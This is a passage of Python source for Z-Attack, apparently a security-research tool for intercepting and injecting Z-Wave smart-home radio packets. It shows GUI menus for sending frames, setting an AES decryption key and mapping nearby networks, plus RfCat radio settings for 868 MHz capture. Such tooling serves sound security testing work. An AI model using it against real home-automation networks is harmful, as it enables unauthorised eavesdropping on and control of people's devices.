		Label(frame_WindowSendEasy, text="Please select a HomeID first").grid(row=1, column=0, padx=10, pady=2)


def defineKey():
	global key 
	print "[NETWORK KEY CHANGED] (hex):"+Nkey_userInput.get()
	key = Nkey_userInput.get()


def windowKey():
	global key,Nkey_userInput
	w_key = Toplevel()
	w_key.wm_title("Z-Attack - AES Encryption")
	rightbottomFrame = Frame(w_key, width=200, height = 600)
	rightbottomFrame.grid(row=0, column=0, padx=10, pady=2)

	Label(rightbottomFrame, text="Define Network Key to decrypt (default OZW):").grid(row=0, column=0, padx=10, pady=2)
	Nkey_userInput = Entry(rightbottomFrame, width = 34, textvariable=key)
	Nkey_userInput.delete(0, END)
	Nkey_userInput.insert(0,key)
	Nkey_userInput.grid(row=1, column=0, padx=10, pady=2)
	
	buttonDefine = Button(rightbottomFrame, text="Define",command=defineKey)
	buttonDefine.grid(row=1, column=1, padx=20, pady=2)	

def windowDiscovery():
	global frame
	w_discovery = Toplevel()
	w_discovery.wm_title("Z-Attack - Discovery")
	frm_scan = Frame(w_discovery, width=200, height = 600)
	frm_scan.grid(row=0, column=1, padx=10, pady=2)
	i=listboxMainHomeID.curselection()

	# Graph generator
	for homeID in Zwave_dic:
		graph = pydot.Dot(graph_type='digraph')
		node_controler = ""
		for j in range(len(Zwave_dic[homeID])):
			nodes = Zwave_dic[homeID][j]
			if str(nodes[0]) == "01":
				node_controler = pydot.Node("HomeID "+homeID, style="filled", fillcolor="red")
				graph.add_node(node_controler)
		if node_controler:	
			for j in range(len(Zwave_dic[homeID])):
				nodes = Zwave_dic[homeID][j]
				if str(nodes[0]) != "01":
					node_x = pydot.Node("NodeID "+str(nodes[0])+" - "+str(nodes[1]) , style="filled", fillcolor="green")
					graph.add_node(node_x)
					graph.add_edge(pydot.Edge(node_controler, node_x))	
		graph.write_png("discovery/"+homeID+"_graph.png")

	if i:
		img = ImageTk.PhotoImage(Image.open("discovery/"+listboxMainHomeID.get(i)+"_graph.png"))
		panel2 = Label(frm_scan, image = img).grid(row=3, column=1, padx=10, pady=2)
		panel2.pack(side = "bottom", fill = "both", expand = "yes")
	else:
		Label(frm_scan, text="Please select a HomeID first").grid(row=1, column=0, padx=10, pady=2)

# TK GUI
root = Tk()
root.wm_title("Z-Attack - Z-Wave Packet Interception and Injection Tool")
root.resizable(width=FALSE, height=FALSE)

leftFrame = Frame(root, width=200, height = 600)
leftFrame.grid(row=0, column=0, padx=10, pady=2)
Label(leftFrame, text="Reception:").grid(row=0, column=0, padx=10, pady=2)

log = Text(leftFrame, width=150, height=30, takefocus=0, fg="green", bg="black")
log.grid(row=0, column=0, padx=10, pady=2)
scrollb = Scrollbar(leftFrame, command=log.yview)
scrollb.grid(row=0, column=1, sticky='nsew')
log['yscrollcommand'] = scrollb.set

rightFrame = Frame(root, width=200, height = 600)
rightFrame.grid(row=0, column=1, padx=10, pady=2)

img = ImageTk.PhotoImage(Image.open("images/zattack.png"))
panel = Label(rightFrame, image = img).grid(row=0, column=0, padx=10, pady=2)

Label(rightFrame, text="Zwave Network Information:").grid(row=1, column=0, padx=10, pady=2)

homeid_found = StringVar()
Label(rightFrame, text="Home ID around you :").grid(row=2, column=0, padx=10, pady=2)

listboxMainHomeID = Listbox(rightFrame, selectmode=SINGLE)
listboxMainHomeID.grid(row=3, column=0, padx=10, pady=2)
	
mainmenu = Menu(root)
menuFile = Menu(mainmenu)
menuFile.add_command(label="Send Frame (advanced mode)", command=windowSendAdvanced)
menuFile.add_command(label="Send Frame (easy mode)", command=windowSendEasy)
menuFile.add_command(label="Define AES key", command=windowKey)
menuFile.add_command(label="Network Map", command=windowDiscovery)
menuFile.add_command(label="Quit", command=root.quit) 
  
menuHelp = Menu(mainmenu)
menuHelp.add_command(label="About", command=windowAbout) 
  
mainmenu.add_cascade(label = "Menu", menu=menuFile) 
mainmenu.add_cascade(label = "Help", menu=menuHelp)

root.config(menu = mainmenu) 

def help():
	print "Z-Attack 0.1"
	print "-d [DEBUG]"
	print "-csv [CSV output]"
	print "-1 [Rfcat] [DEFAULT]"
	print "-2 [TI RF KIT]"
	print "-lcom COM1 [LISTENING PORT] [TI RF KIT]"
	print "-scom COM2 [SENDING PORT] [TI RF KIT]"
	print "Author : Advens "
	exit(0)

def license():
	print "Z-Attack Copyright (C) 2015 Advens"
	print ""
	print "This program comes with ABSOLUTELY NO WARRANTY;"
	print "This is free software, and you are welcome to redistribute it under certain conditions;"

def main():
	global d, debug, fOutput, serialListen, deviceData, scom
	fOutput = 1

	lcom = scom = ""
	deviceData = 1 # Default Rfcat

	argc = len(sys.argv)
	for i in range(argc):
		s = sys.argv[i]
		if i < argc:
			if s in ("-d"):
				debug = 1
			if s in ("-csv"):
				fOutput = 1
			if s in ("-h"):
				help()
				exit(0)
			if s in ("-1"):
				deviceData = 1
			if s in ("-2"):
				deviceData = 2
			if s in ("-lcom"):
				lcom = sys.argv[i+1]
			if s in ("-scom"):
				scom = sys.argv[i+1]			

	if deviceData == 2:
		if lcom and scom:
			try:
				serialListen=serial.Serial(port=lcom, baudrate=115000, bytesize=serial.EIGHTBITS,parity=serial.PARITY_NONE, stopbits=serial.STOPBITS_ONE, timeout=0)
			except:
				print "Error with " + lcom
				exit(0)
		else:
			print "With -2 option, 'lcom' and 'scom' must be set"
			exit(0)
	else:
		d = RfCat(0, debug=False)

		# Thanks to killerzee
		d.setFreq(868399841)
		d.setMdmModulation(MOD_2FSK)
		d.setMdmSyncWord(0xaa0f)
		d.setMdmDeviatn(20629.883)
		d.setMdmChanSpc(199951.172)
		d.setMdmChanBW(101562.5)
		d.setMdmDRate(39970.4)
		d.makePktFLEN(48)
		d.setEnableMdmManchester(False)
		d.setMdmSyncMode(SYNCM_CARRIER_15_of_16)


	license()
	root.after(100, listeningMode)
	root.mainloop()

if __name__ == "__main__":
	main()	
	